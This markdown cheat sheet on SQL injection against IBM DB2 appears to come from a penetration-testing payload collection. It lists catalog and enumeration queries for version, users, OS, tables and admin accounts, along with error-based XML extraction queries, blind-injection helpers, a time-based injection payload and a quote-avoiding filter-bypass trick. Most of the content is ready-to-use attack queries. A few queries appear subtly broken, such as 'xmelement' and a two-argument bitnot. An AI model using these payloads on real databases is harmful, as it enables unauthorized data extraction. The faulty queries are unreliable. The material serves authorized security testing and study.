# db2 injection

> ibm db2 is a family of relational database management systems (rdbms) developed by ibm. originally created in the 1980s for mainframes, db2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments. 


## summary

* [db2 comments](#db2-comments)
* [db2 default databases](#db2-default-databases)
* [db2 enumeration](#db2-enumeration)
* [db2 methodology](#db2-methodology)
* [db2 error based](#db2-error-based)
* [db2 blind based](#db2-blind-based)
* [db2 time based](#db2-time-based)
* [db2 waf bypass](#db2-waf-bypass)
* [db2 accounts and privileges](#db2-accounts-and-privileges)
* [references](#references) 


## db2 comments	

| type                       | description                       |
| -------------------------- | --------------------------------- |
| `--`                       | sql comment                       |


## db2 default databases

| name        | description                                                           |
| ----------- | --------------------------------------------------------------------- |
| sysibm      | core system catalog tables storing metadata for database objects.     |
| syscat      | user-friendly views for accessing metadata in the sysibm tables.      |
| sysstat     | statistics tables used by the db2 optimizer for query optimization.   |
| syspublic   | metadata about objects available to all users (granted to public).    |
| sysibmadm   | administrative views for monitoring and managing the database system. |
| systools    | tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |


## db2 enumeration

| description      | sql query |
| ---------------- | ----------------------------------------- |
| dbms version     | `select versionnumber, version_timestamp from sysibm.sysversions;` |
| dbms version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |
| dbms version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |
| dbms version     | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |
| dbms version     | `select service_level,bld_level from sysibmadm.env_inst_info` |
| current user     | `select user from sysibm.sysdummy1` |
| current user     | `select session_user from sysibm.sysdummy1` |
| current user     | `select system_user from sysibm.sysdummy1` |
| current database | `select current server from sysibm.sysdummy1` |
| os info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |


## db2 methodology

| description      | sql query |
| ---------------- | ------------------------------------ |
| list databases   | `select distinct(table_catalog) from sysibm.tables` |
| list databases   | `select schemaname from syscat.schemata;` |
| list columns     | `select name, tbname, coltype from sysibm.syscolumns` |
| list tables      | `select table_name from sysibm.tables` |
| list tables      | `select name from sysibm.systables` |
| list tables      | `select tbname from sysibm.syscolumns where name='username'` |


## db2 error based

```sql
-- returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- same but without repeated elements
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- returns all in one xml-formatted string.
-- may need cast(xml2clob(… as varchar(500)) to display the result.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```


## db2 blind based

| description      | sql query |
| ---------------- | ------------------------------------------ |
| substring        | `select substr('abc',2,1) from sysibm.sysdummy1` |
| ascii value      | `select chr(65) from sysibm.sysdummy1`     |
| char to ascii    | `select ascii('a') from sysibm.sysdummy1`  |
| select nth row   | `select name from (select * from sysibm.systables order by name asc fetch first n rows only) order by name desc fetch first row only` |
| bitwise and      | `select bitand(1,0) from sysibm.sysdummy1` |
| bitwise and not  | `select bitandnot(1,0) from sysibm.sysdummy1` |
| bitwise or       | `select bitor(1,0) from sysibm.sysdummy1`  |
| bitwise xor      | `select bitxor(1,0) from sysibm.sysdummy1` |
| bitwise not      | `select bitnot(1,0) from sysibm.sysdummy1` |


## db2 time based

heavy queries, if user starts with ascii 68 ('d'), the heavy query will be executed, delaying the response. 

```sql
' and (select count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```


## db2 waf bypass

### avoiding quotes

```sql
select chr(65)||chr(68)||chr(82)||chr(73) from sysibm.sysdummy1
```


## db2 accounts and privileges

| description      | sql query |
| ---------------- | ------------------------------------ |
| list users | `select distinct(grantee) from sysibm.systabauth` |
| list users | `select distinct(definer) from syscat.schemata` |
| list users | `select distinct(authid) from sysibmadm.privileges` |
| list users | `select grantee from syscat.dbauth` |
| list privileges | `select * from syscat.tabauth` |
| list privileges | `select * from sysibm.sysuserauth — list db2 system privilegies` |
| list dba accounts | `select distinct(grantee) from sysibm.systabauth where controlauth='y'` |
| list dba accounts | `select name from sysibm.sysuserauth where sysadmauth = 'y' or sysadmauth = 'g'` |
| location of db files | `select * from sysibmadm.reg_variables where reg_var_name='db2path'` |


## references

- [db2 sql injection cheat sheet - adrián - may 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)
- [pentestmonkey's db2 sql injection cheat sheet - @pentestmonkey - september 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)